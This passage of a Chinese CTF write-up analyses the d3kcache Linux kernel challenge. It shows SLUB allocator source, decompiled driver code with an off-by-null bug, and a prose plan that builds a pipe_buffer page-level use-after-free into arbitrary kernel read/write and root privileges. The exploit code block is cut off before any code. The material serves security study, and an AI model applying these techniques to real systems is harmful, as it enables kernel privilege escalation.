class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能各位会疑惑为什么<code>kmalloc-4k</code>的<code>order</code>为3，这里重新看<code>calculate_order</code>函数，可以看到在对<code>min_objects</code>变量赋值的最后一个操作就是选取最小的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>order_objects</code>函数内部是这样的，并且此时<code>slub_max_order</code>的值为3，所以当size为4k时也就是<code>0x1000</code>时<code>max_objects</code>的值为0x8，所以按照这样计算的话后续求得的<code>order</code>为3。</p><h2 id="d3kcache"><a href="#d3kcache" class="headerlink" title="d3kcache"></a>d3kcache</h2><p>前面铺垫了这么多终于到了题目了，如果有了前面提到的所有基础理论知识再来看这道题的话，<del>依旧无法很轻松的完成</del>。</p><p>题目在开了基本的保护之外还开启了很多的编译选项中的保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>这些基本的都是开启了的，除此之外还开启了一个<code>Control Flow Integrity</code>保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><p>而这个保护会检测ops是否合法，这个检测十分严格，需要ops的值与一个固定的内容进行异或，结果不为0就直接触发<code>kernel panic</code>。也就是因为当时不清楚这个内容导致我调了半天去劫持<code>pipe_buffer</code>的ops指针。</p><h3 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看初始化模块部分，可以看到里面调用了前面提到的<code>kmem_cache_create_usercopy</code>函数，并且参数中size指定为<code>0x800</code>，那么根据前面所以到的，这里的order即为3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// r12</span></span><br><span class="line">  __int64 v20; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [rsp-44h] [rbp-44h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;v26, a3, <span class="number">16LL</span>);</span><br><span class="line">  v5 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">      v20 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);</span><br><span class="line">        v21 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v20] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = <span class="number">0LL</span>;</span><br><span class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v20;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v21] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; kcache_list[<span class="number">4</span> * v26] )</span><br><span class="line">        v11 = kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11;</span><br><span class="line">      v13 = qword_17D8[<span class="number">2</span> * v26];</span><br><span class="line">      v14 = v28;</span><br><span class="line">      _check_object_size(v13, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, <span class="number">1LL</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(v14, v13, v12) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt;= <span class="number">0xF</span>uLL &amp;&amp; qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v27 &gt; <span class="number">0x800</span> || v27 + kcache_list[<span class="number">4</span> * v26] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = qword_17D8[<span class="number">2</span> * v26] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7;</span><br><span class="line">          v10 = v28;</span><br><span class="line">          _check_object_size(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v8 + v9) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      v25 = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    v17 = v27;</span><br><span class="line">    v18 = <span class="number">2048LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt; <span class="number">0x800</span> )</span><br><span class="line">      v18 = v27;</span><br><span class="line">    v19 = v28;</span><br><span class="line">    _check_object_size(v15, v18, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v16, v19, v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="number">0x7FF</span>LL;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        v22 = v17;</span><br><span class="line">      *(_BYTE *)(v16 + v22) = <span class="number">0</span>;</span><br><span class="line">      v23 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);</span><br><span class="line">        v24 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v23] = v16;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = v16;</span><br><span class="line">        v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v23;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v24] = v18;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再就是ioctl函数，逆向分析过后可以发现这里分为四个分支，也就是增删改查，这里漏洞发生在增和改的部分，存在很明显的<code>off by null</code>。除此之外再无其他漏洞。</p><h3 id="预期利用分析"><a href="#预期利用分析" class="headerlink" title="预期利用分析"></a>预期利用分析</h3><p>根据前面所述的内容，目前已经达到了<code>vuln slab page</code>和<code>victim slab page</code>相邻的情况了，而经过后续的分析我们可以得知前面两个页面分别对应的是题目中创建的<code>slab page</code>和<code>pipe_buffer</code>所在的<code>slab_page</code>。答案已经呼之欲出了，如果我们使用题目的<code>off by null</code>漏洞，我们就可以让<code>pipe_buffer-&gt;page</code>指针指向其他<code>pipe_buffer</code>所指向的位置，而如果我们控制其中一个<code>pipe_buffer</code>并释放掉page，就形成了页级的UAF。不过page的大小只有<code>0x40</code>所以成功率只有1/4，因为以<code>0x00</code>结尾时<code>off by null</code>无法影响其指向。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171327450.png"                      alt="image-20230519171327450"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171353853.png"                      alt="image-20230519171353853"                ></p><p>目前我们已经形成了页级的UAF，那么如果我们在已经free的page处申请<code>pipe_buffer</code>会发生什么呢？</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173248182.png"                      alt="image-20230519173248182"                ></p><p>结果就是会形成如上图一样的结构，此时我们可以通过最左边的<code>pipe_buffer</code>读取到它page指向的新的<code>pipe_buffer</code>中的内容，并且此时我们不光可以读取还可以对page的内容进行写，可以让最右边的两个<code>pipe_buffer</code>的page指针又指向同一个，从而形成下面这种情况：<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173704454.png"                      alt="image-20230519173704454"                ></p><p>根据上面的思路，我们还可以将最右边的page给free掉又一次造成了页级的UAF，但是这一次不同的是我们通过第一次的泄漏可以知道最右边page的地址的。有趣的来了，在最右边造成了页级的UAF之后我们继续申请<code>pipe_buffer</code>放在最右边的page中，并且控制里面<code>pipe_buffer</code>的page指针指向自身，最终形成下面这种情况：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519174027597.png"                      alt="image-20230519174027597"                ></p><p>因为是一个页级UAF的缘故，我们还可以使用中间的pipe去修改下面的其他<code>pipe_buffer</code>，所以在最右侧，我们总共可以控制到三个<code>pipe_buffer</code>。而这三个<code>pipe_buffer</code>的作用分别是：</p><ol><li>  第一个管道通过page指针内存空间的任意地址读写</li><li>  第二个管道用于修改第三个管道的内容，让第三个管道可以指向第一个管道</li><li>  第三个管道用于修改第一个管道和第二个管道，修改第一个管道的page到指定位置，修改第二个管道的指向为第三个管道</li></ol><p>这样三个管道实现互相循环修改，即可实现整个内核内存空间几乎无任何限制的任意地址读写。</p><p>既然已经可以任意地址无限制读写了，那么提权的方式也就多种多样了。当然，这里需要提前注意到的是<code>pipe_buffer</code>中的page指针终归是要指向到page结构体的。而内核中<code>vmemmap</code>区域中存放着所有的page结构体，所以首要找到<code>vmemmap</code>区域即可。</p><p>那么第一种方法就是通过修改task_struct中的cred指针为<code>init_cred</code>的地址。</p><p>第二种方法就是通过写内核栈实现ROP的办法，首先需要泄漏出栈地址，在<code>task_struct</code>结构体中存在一个stack成员，顾名思义其中存放的就是栈地址，不过这里存放的是虚拟地址。不过我们如果要往栈空间中写内容的话需要知道他对应的物理地址对应的page结构地址。好在我们可以通过页表获取到对应的物理地址，在<code>task_struct</code>结构体中的<code>mm</code>成员中存放的是<code>mm_struct</code>结构体的地址，而我们可以通过<code>mm_struct</code>结构体中的<code>pgd</code>成员获取到页表的地址。最后通过也变转化即可获取到栈地址对应的page结构体地址了，进而往栈中写入准备的rop即可。</p><p>第三种方法就是通过<code>USMA</code>进行利用也就是<a class="link"   href="https://vul.360.net/archives/391" >用户态映射攻击<i class="fas fa-external-link-alt"></i></a>，原理则是修改内核代码段的内容，不过直接通过直接映射区去修改的话会因为没有写入权限造成<code>kernel panic</code>。但是，改写内核代码段的本质是向其所对应的物理页面写入数据，所以既然我们可以对页表进行读写，那么我们就可以直接在用户空间建立一个到内核代码段对应物理内存的映射就可以改写内核代码了。</p><h3 id="综上所述，可得exp"><a href="#综上所述，可得exp" class="headerlink" title="综上所述，可得exp"></a>综上所述，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 